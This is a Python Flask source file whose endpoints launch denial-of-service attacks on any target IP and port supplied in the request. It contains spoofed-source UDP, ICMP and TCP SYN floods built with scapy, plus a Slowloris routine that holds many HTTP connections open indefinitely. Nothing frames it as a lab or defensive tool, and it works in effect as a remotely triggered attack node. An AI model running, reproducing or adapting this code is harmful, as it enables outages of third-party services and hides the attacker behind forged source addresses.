import time
import sys
import socket
import random

from flask import Flask
from scapy.all import *
from flask import request

app = Flask(__name__)

def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randPort():
    x = random.randint(0, 64000)
    return x

@app.route('/udp')
def udp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
        #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create UDP object to given destination port
        udp = UDP(dport=dest_port)
        #Create packet from IP packet and UDP Object
        pkt = packet/udp
        #Send request
        send(pkt)
    return "Success"


@app.route('/icmp')
def icmp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
	    #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create packet from IP packet and ICMP Object
        pkt = packet/ICMP()
        #Send request
        send(pkt)
    return "Success"

@app.route('/tcp')
def tcp_flood():
    dest_ip_address = request.args.get('ip')
    dest_port = int(request.args.get('port'))
    pkt_count = int(request.args.get('pktCount'))

    for i in range(0, pkt_count):
        #Generate radnomIP address to indicate the source
        src_ip = randomIP()
        #create an IP packet from source IP to destination IP
        packet = IP(src=str(src_ip), dst=dest_ip_address)
        #Create TCP object with random source port and given destination port
        tcp = TCP(sport=RandShort(), dport=dest_port, flags="S")
        #Create packet from IP packet and TCP Object
        pkt = packet/tcp
        #Send request
        send(pkt)
    return "Success"

@app.route('/slowloris')
def slowloris():
    try:
        global allthesockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        howmany_sockets = int(request.args.get('pktCount'))
        ip = request.args.get('ip')
        port = int(request.args.get('port'))
        allthesockets = []
        print("Creating sockets...")
        for k in range(howmany_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                allthesockets.append(s)
            except Exception as e:
                print(e)
        print(range(howmany_sockets)," sockets are ready.")
        num = 0
        for r in allthesockets:
            print("[",num,"]")
            num += 1 
            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            print("Successfully sent [+] GET /? HTTP /1.1 ...")
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))
            print("Successfully sent [+] Headers ...")
 
        while True:
            for v in allthesockets:
                try:
                    v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                    print("[-][-][*] Waiter sent.")
                except:
                    print("[-] A socket failed, reattempting...")
                    allthesockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip,port))
                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass
 
            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
            print("Sleeping off ...")
            time.sleep(10)
            
        
        
    except ConnectionRefusedError:
        print("[-] Connection refused, retrying...")
        slowloris()
    
 
